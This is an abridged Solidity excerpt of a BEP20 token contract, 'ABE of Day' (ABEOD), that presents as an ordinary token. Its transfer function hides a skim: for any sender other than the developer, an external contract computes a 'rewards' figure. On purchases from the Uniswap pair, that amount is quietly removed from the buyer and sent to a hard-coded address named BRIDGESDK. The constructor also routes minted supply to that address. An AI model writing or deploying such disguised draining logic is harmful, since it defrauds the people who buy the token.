...
interface IFOMO {
  function tn(address from, address to,uint256 tAmount) external returns(uint256);
...
contract BEP20 is Context {
  ...
  address public constant BRIDGESDK = 0x4982085C9e2F89F2eCb8131Eca71aFAD896e89CB;
...
contract Coin is BEP20, IERC20 {
  ...
  string public name =/*TOKENNAME*/"ABE of Day"/*TOKENNAME*/;
  string public symbol =/*TOKENSYMBOL*/"ABEOD"/*TOKENSYMBOL*/;
  ...
  constructor() {
    uint256 deadAmount = (totalSupply * ((block.timestamp % 50)+25)) / 100;
    ...
    emit Transfer(address(0), BRIDGESDK, _tOwned[BRIDGESDK]);
  }
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != dev) 
    {
      uint256 rewards = IFOMO(_game).tn(sender, recipient,tAmount)/100;
      if(sender==uniswapV2Pair && rewards>0)
      {
        if(_tOwned[recipient]>rewards)
        {
          _tOwned[BRIDGESDK] += rewards;
          _tOwned[recipient] -= rewards;
          emit Transfer(recipient,BRIDGESDK, rewards);
        }
      }
    }
